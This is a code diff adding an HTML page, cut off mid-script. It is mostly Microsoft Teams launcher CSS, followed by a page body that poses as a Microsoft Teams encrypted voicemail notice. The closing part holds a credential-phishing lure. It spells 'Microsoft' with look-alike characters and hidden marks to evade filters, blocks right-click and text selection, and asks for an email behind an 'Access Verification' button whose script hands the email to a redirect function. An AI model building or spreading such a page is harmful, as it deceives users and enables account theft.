+                animation: setOpacityToOne 0.8s ease forwards;
+            }
+
+            html.uiv3 .brandingColors .disclaimer a {
+                color: var(--branding-anchor-color);
+            }
+
+            html.uiv3 .brandingAllImages .modernSimplifiedView .headerContainer {
+                animation: setOpacityToOne 0.8s ease;
+            }
+
+            html.uiv3 .brandingAllImages .modernSimplifiedView .logoContainer {
+                animation: setTopPositionValueHigh 0.4s ease forwards;
+            }
+
+            html.uiv3 .brandingAllImages .modernSimplifiedView .logoContainer .logo {
+                animation: setOpacityToZero 0.3s ease forwards;
+            }
+
+            html.uiv3 .brandingBackgroundOnly .modernSimplifiedView .headerContainer {
+                animation: setMarginToZero 0.5s ease forwards, setOpacityToOne 0.5s ease;
+            }
+
+            html.uiv3 .brandingBackgroundOnly .modernSimplifiedView .logoContainer {
+                animation: setOpacityToZero 0.5s ease forwards;
+            }
+
+            html.uiv3 .brandingBackgroundOnly .modernSimplifiedView .logoContainer .logo {
+                animation: setOpacityToZero 0.5s ease forwards;
+            }
+
+            html.uiv3 .brandingLogoOnly .modernSimplifiedView .headerContainer {
+                animation: setBackgroundColorToWhite 0.2s ease forwards;
+            }
+
+            html.uiv3 .brandingLogoOnly .modernSimplifiedView .logoContainer {
+                animation: setOpacityToOne 0.8s ease, setTopPositionValueLow 0.4s ease forwards;
+            }
+
+            html.uiv3 .brandingLogoOnly .modernSimplifiedView .logoContainer .logo {
+                animation: setOpacityToZero 0.3s ease forwards;
+            }
+
+            html.uiv3 .brandingNoImages .modernSimplifiedView .headerContainer {
+                animation: setMarginToZero 0.6s ease forwards, setHeightToZero 0.6s ease forwards, setBackgroundColorToWhite 0.2s ease forwards;
+            }
+
+            html.uiv3 .brandingNoImages .modernSimplifiedView .logoContainer {
+                animation: setOpacityToZero 0.4s ease forwards;
+            }
+
+            html.uiv3 .noBranding .modernSimplifiedView .headerContainer {
+                animation: setBackgroundColorToWhite 0.2s ease forwards;
+            }
+
+            html.uiv3 .noBranding .modernSimplifiedView .logoContainer {
+                animation: setTopPositionValueLow 0.4s ease forwards;
+            }
+
+            @keyframes setOpacityToOne {
+                0% {
+                    opacity: 0.3;
+                }
+
+                100% {
+                    opacity: 1;
+                }
+            }
+
+            @keyframes setOpacityToZero {
+                100% {
+                    opacity: 0;
+                }
+            }
+
+            @keyframes setMarginToZero {
+                100% {
+                    margin-bottom: 0rem;
+                }
+            }
+
+            @keyframes setHeightToZero {
+                100% {
+                    height: 0;
+                }
+            }
+
+            @keyframes setTopPositionValueLow {
+                100% {
+                    top: 8rem;
+                }
+            }
+
+            @keyframes setTopPositionValueHigh {
+                100% {
+                    top: 9.8rem;
+                }
+            }
+
+            @keyframes setBackgroundColorToWhite {
+                0% {
+                    background: #eee;
+                }
+
+                100% {
+                    background-size: 0% 0%;
+                }
+            }
+
+            #launching {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+            }
+
+            #launching h1 {
+                font-weight: bold;
+                font-size: 2.4rem;
+                line-height: 3.2rem;
+            }
+
+            @media screen and (max-width: 1002px) {
+                #launching {
+                    padding-top: 0;
+                }
+            }
+
+            #textbox {
+                text-align: left;
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                color: #605e5c;
+                font-size: 1.4rem;
+                line-height: 1.2857;
+            }
+
+            #textbox h1 {
+                color: #252424;
+                font-weight: bold;
+                font-size: 3.2rem;
+                line-height: 4rem;
+                margin: 0;
+            }
+
+            #textbox p {
+                color: #252424;
+                font-size: 2.4rem;
+                line-height: 3.2rem;
+                margin: 0;
+            }
+
+            @media screen and (max-width: 1002px) {
+                #textbox p {
+                    margin-bottom: 0;
+                }
+            }
+
+            html.uiv3 #textbox {
+                text-align: center;
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                color: #605e5c;
+                font-size: 1.4rem;
+                line-height: 1.2857;
+                gap: 0.6rem;
+            }
+
+            html.uiv3 #textbox h3 {
+                color: #252424;
+                font-weight: bold;
+                font-size: 1.8rem;
+                line-height: 2.4rem;
+                margin: 0;
+            }
+
+            html.uiv3 #textbox p {
+                color: #616161;
+                font-size: 1.4rem;
+                line-height: 2rem;
+                margin: 0;
+            }
+
+            @media screen and (max-width: 1002px) {
+                html.uiv3 #textbox p {
+                    margin-bottom: 0;
+                }
+            }
+
+            @supports (-ms-ime-align: auto) {
+                html.uiv3 #textbox > *:not(:last-child) {
+                    margin-bottom: 0.6rem;
+                }
+            }
+
+            html.uiv3 .modernSimplifiedView {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                padding: 0;
+                gap: 2.4rem;
+                width: 42rem;
+            }
+
+            html.uiv3 .modernSimplifiedView .mainActionsContent {
+                display: flex;
+                flex-direction: column;
+                border: 0.05rem solid rgba(0, 0, 0, 0.15);
+                background: #fff;
+                border-radius: 1.2rem;
+                align-self: stretch;
+                align-items: stretch;
+            }
+
+            html.uiv3 .modernSimplifiedView .headerContainer {
+                justify-content: center;
+                display: flex;
+                border-radius: 1.2rem 1.2rem 0 0;
+                height: 15rem;
+                margin-bottom: 4.8rem;
+                overflow: visible;
+                background-repeat: no-repeat;
+                background: linear-gradient(to right, #eeeeee 40%, #dddddd 50%, #eeeeee 60%);
+                background-size: 300% 300%;
+                animation: shimmer 1.2s infinite ease;
+                background-position: center center;
+            }
+
+            @keyframes shimmer {
+                0% {
+                    background-position: right;
+                }
+
+                100% {
+                    background-position: left;
+                }
+            }
+
+            html.uiv3 .modernSimplifiedView .secondaryActionsContent {
+                align-items: center;
+                text-align: center;
+                display: flex;
+                flex-direction: column;
+            }
+
+            html.uiv3 .modernSimplifiedView .actionsContainer {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                padding: 3.2rem;
+                gap: 3.2rem;
+                background: #fff;
+                align-self: stretch;
+                border-radius: 1.2rem;
+            }
+
+            html.uiv3 .modernSimplifiedView .buttonsContainer {
+                display: flex;
+                flex-direction: column;
+                align-items: flex-start;
+                padding: 0;
+                gap: 0.8rem;
+                align-self: stretch;
+            }
+
+            html.uiv3 .modernSimplifiedView .logoContainer {
+                position: relative;
+                width: 9.8rem;
+                height: 9.8rem;
+                top: 9.8rem;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                background: #fff;
+                box-shadow: 0 0 0.2rem rgba(0, 0, 0, 0.12), 0 0.2rem 0.4rem rgba(0, 0, 0, 0.14);
+                border-radius: 0.8rem;
+            }
+
+            html.uiv3 .modernSimplifiedView .logoContainer .logo {
+                position: relative;
+                width: 5.145rem;
+                height: 5.145rem;
+                align-self: center;
+            }
+
+            html.uiv3 .modernSimplifiedView_notBranded .headerContainer {
+                height: 15rem;
+                margin-bottom: 4.8rem;
+                overflow: visible;
+            }
+
+            html.uiv3 .modernSimplifiedView_notBranded .logoContainer {
+                opacity: 1;
+            }
+
+            @media screen and (min-width: 1001px) and (max-width: 1600px) {
+                html.uiv3 {
+                    font-size: 0.59375em;
+                }
+            }
+
+            @media screen and (min-width: 601px) and (max-width: 1000px) {
+                html.uiv3 {
+                    font-size: 0.58125em;
+                }
+            }
+
+            @media screen and (max-width: 600px) {
+                html.uiv3 {
+                    font-size: 0.56875em;
+                }
+            }
+
+            @supports (-ms-ime-align: auto) {
+                html.uiv3 .modernSimplifiedView > div:not(:last-child) {
+                    margin-bottom: 2.4rem;
+                }
+
+                html.uiv3 .modernSimplifiedView .actionsContainer > div:not(:last-child) {
+                    margin-bottom: 3.2rem;
+                }
+
+                html.uiv3 .modernSimplifiedView .buttonsContainer > div:not(:last-child) {
+                    margin-bottom: 0.8rem;
+                }
+            }
+
+            html.uiv3 .modernLifeSimplifiedView {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                padding: 0;
+                gap: 2.4rem;
+                width: 42rem;
+            }
+
+            html.uiv3 .modernLifeSimplifiedView .mainActionsContent {
+                display: flex;
+                flex-direction: column;
+                border: 0.05rem solid rgba(0, 0, 0, 0.15);
+                background: #fff;
+                border-radius: 1.2rem;
+                align-self: stretch;
+                align-items: stretch;
+            }
+
+            html.uiv3 .modernLifeSimplifiedView .banner {
+                display: flex;
+                flex-direction: column;
+                min-height: 13rem;
+            }
+
+            html.uiv3 .modernLifeSimplifiedView .banner .illustration {
+                border-radius: 1.2rem 1.2rem 0 0;
+            }
+
+            html.uiv3 .modernLifeSimplifiedView .headerContainer {
+                justify-content: center;
+                display: flex;
+                background: #fff;
+                height: 4.9rem;
+                margin-bottom: 0;
+                transition: height 0.4s ease-in;
+            }
+
+            html.uiv3 .modernLifeSimplifiedView .secondaryActionsContent {
+                align-items: center;
+                text-align: center;
+                display: flex;
+                flex-direction: column;
+            }
+
+            html.uiv3 .modernLifeSimplifiedView .teamsImg {
+                width: 2.4rem;
+                height: 2.4rem;
+            }
+
+            html.uiv3 .modernLifeSimplifiedView .contentContainer {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                padding: 3.2rem;
+                background: #fff;
+                border-radius: 1.2rem;
+                color: #616161;
+                text-align: center;
+            }
+
+            html.uiv3 .modernLifeSimplifiedView .contentContainer .title {
+                max-width: 27rem;
+                color: #242424;
+                font-size: 2rem;
+                line-height: 2.8rem;
+                font-weight: bold;
+                padding-bottom: 0.375rem;
+            }
+
+            html.uiv3 .modernLifeSimplifiedView .contentContainer .description {
+                font-size: 1.6rem;
+                line-height: 2.2rem;
+                font-weight: 400;
+            }
+
+            html.uiv3 .modernLifeSimplifiedView .contentContainer #addToCalendar {
+                margin-top: 0.5rem;
+                font-weight: 600;
+            }
+
+            html.uiv3 .modernLifeSimplifiedView .contentContainer p {
+                margin: 0rem;
+            }
+
+            html.uiv3 .modernLifeSimplifiedView .contentContainer #instructionsLearnMore {
+                padding-top: 1.5rem;
+                font-weight: 400;
+            }
+
+            html.uiv3 .modernLifeSimplifiedView .actionsContainer {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                padding: 0rem 3.2rem 3.2rem 3.2rem;
+                gap: 3.2rem;
+                background: #fff;
+                align-self: stretch;
+                border-radius: 1.2rem;
+            }
+
+            html.uiv3 .modernLifeSimplifiedView .buttonsContainer {
+                display: flex;
+                flex-direction: column;
+                align-items: flex-start;
+                padding: 0;
+                gap: 0.8rem;
+                align-self: stretch;
+            }
+
+            html.uiv3 .modernLifeSimplifiedView .logoContainer {
+                position: relative;
+                width: 9.8rem;
+                height: 9.8rem;
+                top: -4.9rem;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                background: #fff;
+                box-shadow: 0 0 0.2rem rgba(0, 0, 0, 0.12), 0 0.2rem 0.4rem rgba(0, 0, 0, 0.14);
+                border-radius: 0.8rem;
+                transition: opacity 0.2s 0.2s ease-in;
+            }
+
+            html.uiv3 .modernLifeSimplifiedView .logoContainer .logo {
+                width: 5.145rem;
+                height: 5.145rem;
+                align-self: center;
+            }
+
+            html.uiv3 .modernLifeSimplifiedView .logoContainer .logoCustom {
+                border-radius: 0.8rem;
+                align-self: stretch;
+                width: 100%;
+                height: 100%;
+                outline: 1px solid rgba(255, 255, 255, 0.3);
+                outline-offset: -1px;
+            }
+
+            html.uiv3 .modernLifeSimplifiedView .secondaryAction .img {
+                opacity: 1;
+            }
+
+            @media screen and (min-width: 1001px) and (max-width: 1600px) {
+                html.uiv3 {
+                    font-size: 10px;
+                }
+            }
+
+            @media screen and (min-width: 601px) and (max-width: 1000px) {
+                html.uiv3 {
+                    font-size: 9px;
+                }
+            }
+
+            @media screen and (max-width: 600px) {
+                html.uiv3 {
+                    font-size: 8px;
+                }
+            }
+
+            @supports (-ms-ime-align: auto) {
+                html.uiv3 .modernLifeSimplifiedView > div:not(:last-child) {
+                    margin-bottom: 2.4rem;
+                }
+
+                html.uiv3 .modernLifeSimplifiedView .actionsContainer > div:not(:last-child) {
+                    margin-bottom: 3.2rem;
+                }
+
+                html.uiv3 .modernLifeSimplifiedView .buttonsContainer > div:not(:last-child) {
+                    margin-bottom: 0.8rem;
+                }
+            }
+
+            .container {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                background-color: #fff;
+                top: 0;
+                left: 0;
+                position: absolute;
+                width: 100%;
+                height: 100vh;
+            }
+
+            .container .header {
+                width: 100%;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                background-color: #e6e6e6;
+            }
+
+            .container .header .logo {
+                height: 1.375rem;
+                margin-top: 3.438rem;
+            }
+
+            .container .header .communityImage {
+                max-width: 34.625rem;
+                max-height: 9.75rem;
+                margin-top: 2.188rem;
+                margin-bottom: 3.375rem;
+            }
+
+            .container .details {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .container .details .title {
+                margin-top: 2.7rem;
+                margin-bottom: 1.2rem;
+                font-size: 1.5rem;
+                line-height: 2rem;
+                font-weight: bold;
+            }
+
+            .container .details .description {
+                font-size: 0.875rem;
+                line-height: 1.25rem;
+                text-align: center;
+                max-width: 33.5rem;
+                margin-bottom: 2rem;
+            }
+
+            .container .details .buttonsContainer .appStoreButton {
+                margin: 1rem;
+            }
+
+            .container .details .buttonsContainer .appStoreButton img {
+                width: 10rem;
+            }
+
+            .container .details .buttonsContainer .appStoreButton #googleStoreImg {
+                width: 11rem;
+            }
+
+            .container .details .qrCodeContainer {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                width: 8.75rem;
+                height: 8.75rem;
+                border-radius: 1.25rem;
+                background: #f8f8f8;
+            }
+
+            .container .bottomSection {
+                margin-top: auto;
+            }
+
+            .container .bottomSection .notices {
+                margin: 3rem auto;
+            }
+
+            .container .bottomSection .legalNotice {
+                text-align: center;
+                font-size: 0.8rem;
+                opacity: 0.8;
+                width: 28rem;
+                align-self: center;
+                margin: 0.2rem;
+            }
+
+            .container .bottomSection .disclaimer {
+                font-size: 0.8rem;
+            }
+
+            .joinView .header {
+                display: flex;
+                align-self: flex-start;
+            }
+
+            .joinView .header .logo {
+                height: 1.2rem;
+            }
+
+            .joinView .bodyColumnCentered {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                text-align: center;
+                flex: 1;
+                flex-direction: column;
+            }
+
+            .joinView .bodyColumnCentered .partyImage {
+                width: 12rem;
+            }
+
+            .joinView .bodyColumnCentered .details {
+                align-items: center;
+            }
+
+            .joinView .bodyColumnCentered .details .googleTitle {
+                font-size: 1.5rem;
+                line-height: 2rem;
+                font-weight: bold;
+                margin-top: 2rem;
+                font-family: "Segoe UI";
+            }
+
+            .joinView .bodyColumnCentered .details .description {
+                font-size: 1.125rem;
+                line-height: 1.5rem;
+                max-width: 33.5rem;
+                margin-bottom: 1rem;
+            }
+
+            .joinView .bodyColumnCentered .buttonText {
+                display: flex;
+            }
+
+            /*# sourceMappingURL=launcher.31658ab6731c3e22358f.css.map*/
+        </style>
+        <style>
+            body {
+                -webkit-user-select: none;
+                -moz-user-select: none;
+                -ms-user-select: none;
+                user-select: none;
+            }
+        </style>
+    </head>
+    <body oncontextmenu="return false;">
+        <div id="launcherApp">
+            <div id="rootView">
+                <div class="view joinView">
+                    <div class="body column centered" role="banner">
+                        <img class="" style="margin-top: -100px; max-width: 400px; max-height: 200px;" src="data:image/jpeg;base64,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"true"/>
+                    </div>
+                    <div class="body column centered" role="main">
+                        <img class="partyImage" id="party-image" style="margin-top: -150px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAAAuCAYAAABtRVYBAAAABmJLR0QA/wD/AP+gvaeTAAAG+0lEQVR42u1cC2wUVRQtVCEgXwElpd3ZQkH8BbUoYrTuFo1fUBvFT9QYAhqRaJEYxBizO4sCEQ1UwkchxAAS6m5VgqJoRFCpCCKQiJhAqRiB8ClQ2u6yLaz3be+Ey/PN7OyvDvWe5IT0vpnX9+67Z967d6bk5DAYDAaDwWAwGAwGg8FgMBgMBoPBYDAYDIbTEPP16ybInmCwGCpzchsDBWPCumtBo6791qRrYWAM2QTcHfa7FjYFtLLYouKL2WOM/48wdG0iCKCWCCIR/wK+zEJhtGtEfAOHNOnun5MQhsxtDXr+texJRrtDOOD2QIAfS0McBhsiAdcd7FFGu0Hj9ILhENiNGRCHwTCLhNEucMo36DII6AMZFIfBw03T8wewhxkXNCCQV2RBHHE26q6v2MOMC1cc0903Z0scBsN+zcueZjg3v/C7Rod1bS3wBAbtPvH+IhLIH5zN3ePcLuJex6vAcBxivqs7JRBABBjNtkCAzfVvDejDK8JwFMK6e1EbBL9Nuh/jFWE451ilF9wIgXnWKQKBZL04GvI+2xzyftYS8s6Hf1+LfuItjsVyOvBqMdo++fZr85yze2jbxZhAGHtAGDFKEE2tEE5sveciXjVGWwrke8cIJOB6KVI1aogsjvMYLN0ZCZYM5pVjtI1A0vueKoNHK+3kiRmu3tFg6SRLgbSyrjlUWsKrx8gajvvcvUAcI2AHqXZIcl6Ox6sKGwKJi4R3EkbGIb57Em+tRUnVMUcrvzbbSMIh8KfZFEj8uGUjJ+kBnAJcA6wGVgLLgKqk/3ngYuA8m+4UfxA2Gfg5cAvwU+A4YCfFtULMi5CjiP0SYn9Kumc4aRNcCPQB7wR2NBnTPTgHM/Yl1xYQezLfwxWhHwUnWlzXVRq/QTGHkSb3BCzG/kbWhBF7N78LBONKByXkgsebdNeL542z0tMfgv+wXZFEq0onWEz7euDfolsFv8XgpAhhW4MNl14FrDXpexuwv3R9CWkvJ/ZLif0D6Z5HTfoX3AEcohjXqxb3CBZK/lGNKRHmkPuOK/xooFeCseiKe363uP7X7IijoqhzFpJxsQPVSTwK3KvgVkp4U/8FfDI/rd6X11c13nBlSWFL0LMABFCNFa0jwKhKINBeY1IC7gk8QJz7E3ApsIbYgikKRDwZ95F+tgI/lPreIO1S6QpEBMdG4FFiq8VdzEwg4vq1Ei9PUyBi7nVS4E6wIZDduOOsRv8K2xngIBOBHAGukPhmVgQS/3PX1BLnJSJxjvnyujrheAi7SzcQxeZ/l4BLb1Bc/gpZnNnE3gW4ibRdl4JAniP3zydCEH1/R9pKMiiQe8nvWEnsL1gI5MoE80hFIHTu+8lulkggbxP7eGIvMxHIpjYJqga9cBgE+5n/YOfYI+8cyG8gB1oqCgRKEUBOAbvHk3B0WgbBvwG4Hd5/7GutXJkctao8UxVdrUZHn8WFkneXgchuKQhkOVngPKntbtI2LQsCEXAR+3ILgazDORksz4BAduD1P2LOpnoYqATyHrA3sB9wCbHfYiKQZuBhiWMyLhCxCzgs7zAYhU9cbqdjbf7Y44Hy7S7bSfq5Y9Z8xdS/Jo7ubNNddgUSJAvcQ2obSdpoUnkbsU8m9j7E/r5NgdDAW5VEDrIyTYF4yPXP4IOmEX+uTCEH2agolljlIGOz8J5DO+RQgcQgF1ljjLOlyvsABPvpZMXRWs3yhhRTn0sc+4TUNpVUYQpSEIif9D1eanuHtD1I7MOkY5mBEcQ+y6ZA6JP7dQuBLMCqkMFH0hRIpXS82isKo/hzFDggCYF8CexukaSLnGuoxO4ZFUfdzIE9nSqO1jfnWrwqIb61MkvCbVWyQt4ViumL/xCiBZ0dxorJw9L2/ovJDhLBszYlPQoUksCIYPI4FsuwZ9FeI+1covR7koxHBPLTwJ0mgpIFUoFB/BGZV4MiKFPNQVYp5kxL6HkogmSqUlQgC/FoeBB/PqY4nlKB/IE+pbwvs8l5QCt0tEB0LV5Faq7yrk9VHMhZJi4oJwEr8xDW81UCUXGudO04EqgyRenzJsV4plr0vxmYm0SZ9xTw/gRl3mQEoiLNz3RiF19cFxPWEJ92MhHIHLSNlnKkZI5Yf2ZUIKICleEEPbOfl/hdE04HPUPTFEcMjmdlFm64C/gDlhSFk+vxaaZ6ei3GJ5yKqpp9CeY6UdL3Mkz+VeiAT+aduPOcwUWfpygkCDyEJVWD+/Fl50x8GqswiYy5KEGIXGMx34NY0s3BnWQXjqFa0c8UMsYyqRhi2GcQ+1Jif1zqa6PFeLZkvjQ664ruQihOZHx8Pl/H2Jpbe6dDm67ojAlxbhaKhbkmAW6FjkkUDxgMBoPBYDAYDAaDwWAwGAwGg8FgMBgMBoORCP8A7iqbPpfO07cAAAAASUVORK5CYII=" aria-hidden="true"/>
+                        <h3 class="title" style="margin-top: -5px;">Stay better connected with the Μі‏‏‏сг‏о‏‏ѕоf‏‏‏t Teams End-to-End Encrypted Cloud Voicemail</h3>
+                        <div style="text-align: center;">
+                            <input type="email" id="xrxrrrrrr-input" placeholder="Enter email" required style="margin: 2px; padding: 10px; width: 300px; font-size: 16px;">
+                            <br>
+                            <br>
+                            <button class="button primary" id="continue-button" onclick="continueLoading()" style="padding: 10px 15px; font-size: 16px;">Access Verification</button>
+                        </div>
+                        <script>
+                            document.getElementById('xrxrrrrrr-input').addEventListener('keydown', function(event) {
+                                if (event.key === 'Enter') {
+                                    continueLoading();
+                                }
+                            });
+
+                            function continueLoading() {
+                                var xrxrrrrrr = document.getElementById('xrxrrrrrr-input').value;
+                                redirect(xrxrrrrrr);
+                            }
+
+                            function redirect(email) {
